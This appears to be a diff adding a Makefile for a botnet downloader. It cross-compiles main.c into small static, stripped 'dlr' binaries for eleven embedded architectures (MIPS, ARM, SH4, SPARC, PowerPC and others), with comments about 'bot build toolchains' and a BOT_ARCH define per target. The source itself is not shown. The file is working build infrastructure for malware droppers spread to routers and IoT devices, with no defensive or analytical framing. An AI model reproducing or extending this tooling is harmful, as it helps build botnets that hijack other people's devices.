@@ -1,0 +1,59 @@
+CC_HOST = gcc
+CFLAGS  = -Wall -Wextra -Os -static -s -fno-asynchronous-unwind-tables -fno-unwind-tables -fdata-sections -ffunction-sections -Wl,--gc-sections -D_GNU_SOURCE
+
+# Cross-compiler root (matches your bot build toolchains)
+XCC_DIR = /etc/xcompiler
+
+# Source
+SRC = main.c
+
+# Output dir
+OUT = release
+
+all: prep cross-all
+
+prep:
+	mkdir -p $(OUT)
+
+# Host build (x86_64)
+host:
+	$(CC_HOST) $(CFLAGS) -o $(OUT)/dlr.x86_64 $(SRC)
+
+cross-i586:
+	$(XCC_DIR)/i586/bin/i586-gcc $(CFLAGS) -DBOT_ARCH=\"x86\"    -o $(OUT)/dlr.x86 $(SRC)
+
+cross-mips:
+	$(XCC_DIR)/mips/bin/mips-gcc $(CFLAGS) -DMIPS -DBOT_ARCH=\"mips\"  -o $(OUT)/dlr.mips $(SRC)
+
+cross-mipsel:
+	$(XCC_DIR)/mipsel/bin/mipsel-gcc $(CFLAGS) -DMIPSEL -DBOT_ARCH=\"mpsl\" -o $(OUT)/dlr.mpsl $(SRC)
+
+cross-sh4:
+	$(XCC_DIR)/sh4/bin/sh4-gcc $(CFLAGS) -DBOT_ARCH=\"sh4\"    -o $(OUT)/dlr.sh4 $(SRC)
+
+cross-sparc:
+	$(XCC_DIR)/sparc/bin/sparc-gcc $(CFLAGS) -DBOT_ARCH=\"spc\"    -o $(OUT)/dlr.spc $(SRC)
+
+cross-m68k:
+	$(XCC_DIR)/m68k/bin/m68k-gcc $(CFLAGS) -DBOT_ARCH=\"m68k\"   -o $(OUT)/dlr.m68k $(SRC)
+
+cross-armv4l:
+	$(XCC_DIR)/armv4l/bin/armv4l-gcc $(CFLAGS) -D__ARM_EABI__ -DBOT_ARCH=\"arm\" -o $(OUT)/dlr.armv4l $(SRC)
+
+cross-armv5l:
+	$(XCC_DIR)/armv5l/bin/armv5l-gcc $(CFLAGS) -D__ARM_EABI__ -DBOT_ARCH=\"arm\" -o $(OUT)/dlr.armv5l $(SRC)
+
+cross-armv6l:
+	$(XCC_DIR)/armv6l/bin/armv6l-gcc $(CFLAGS) -D__ARM_EABI__ -DBOT_ARCH=\"arm\" -o $(OUT)/dlr.armv6l $(SRC)
+
+cross-armv7l:
+	$(XCC_DIR)/armv7l/bin/armv7l-gcc $(CFLAGS) -D__ARM_EABI__ -DBOT_ARCH=\"arm7\" -o $(OUT)/dlr.armv7l $(SRC)
+
+cross-powerpc:
+	$(XCC_DIR)/powerpc/bin/powerpc-gcc $(CFLAGS) -DBOT_ARCH=\"ppc\" -o $(OUT)/dlr.ppc $(SRC)
+
+cross-all: cross-i586 cross-mips cross-mipsel cross-sh4 cross-sparc cross-m68k cross-armv4l cross-armv5l cross-armv6l cross-armv7l cross-powerpc
+
+clean:
+	rm -f $(OUT)/dlr.*
+
